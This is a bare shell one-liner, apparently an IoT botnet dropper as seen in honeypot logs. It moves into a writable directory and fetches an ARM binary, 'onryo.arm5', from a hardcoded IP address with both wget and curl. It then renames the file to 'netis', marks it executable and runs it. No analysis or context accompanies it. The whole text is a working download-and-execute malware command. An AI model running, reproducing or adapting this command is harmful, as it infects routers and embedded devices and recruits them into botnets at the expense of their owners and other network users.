cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.159.130.27/bins/onryo.arm5; curl -O http://185.159.130.27/bins/onryo.arm5;cat onryo.arm5 >netis;chmod +x *;./netis ssh.wget
